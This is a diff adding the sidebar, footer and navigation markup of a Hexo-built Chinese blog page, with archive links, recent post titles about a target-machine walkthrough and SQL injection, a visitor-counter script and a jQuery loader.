+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/01/07/moneybox%E9%9D%B6%E6%9C%BA/">moneybox靶机</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/">sql注入第三弹</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/">sql注入第二弹（sqlmap）</a>
+          </li>
+        
+          <li>
+            <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%80%E5%BC%B9/">sql注入第一弹</a>
+          </li>
+        
+          <li>
+            <a href="/2023/12/25/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB/">前后端分离</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+      <div class="widget-box">
+    <h3 class="widget-title">友链</h3>
+    <div class="widget">
+      
+        <a style="display: block;" href="https://yiluyanxia.github.io/" title target='_blank'
+        >一路眼瞎</a>
+      
+    </div>
+  </div>
+
+  
+</aside>
+      </div>
+      <footer id="footer">
+  <div class="foot-box global-width">
+    &copy; 2024 John Doe &nbsp;&nbsp;
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
+  </div>
+</footer>
+      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
+<script>
+if (!window.jQuery) {
+var script = document.createElement('script');
+script.src = "/js/jquery-2.0.3.min.js";
+document.body.write(script);
+}
+</script>
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+    </div>
+    <nav id="mobile-nav" class="mobile-nav-box">
+  <div class="mobile-nav-img mobile-nav-top"></div>
+  
+    <a href="/archives" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+  <div class="mobile-nav-img  mobile-nav-bottom"></div>
+</nav>    
+  </div>
+</body>
+</html>
